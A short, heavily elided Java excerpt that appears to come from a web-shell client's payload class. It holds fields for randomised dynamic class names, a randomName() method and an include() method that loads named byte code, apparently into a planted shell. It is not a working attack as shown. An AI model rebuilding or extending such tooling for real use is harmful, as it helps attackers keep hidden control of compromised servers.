...
import shells.payloads.java.DynamicUpdateClass;
import util.Log;
...
implements Payload {
    ...
    private HashSet dynamicClassNameSet = DynamicUpdateClass.getAllDynamicClassName();
    private HashMap<String, String> dynamicClassNameHashMap = new HashMap();
    ...
    public synchronized String randomName() {
        String[] classNames = this.dynamicClassNameSet.toArray(new String[0]);
    ...
    public boolean include(String codeName, byte[] binCode) {
        ...
        if ((codeName = this.dynamicClassNameHashMap.get(codeName)) != null) {
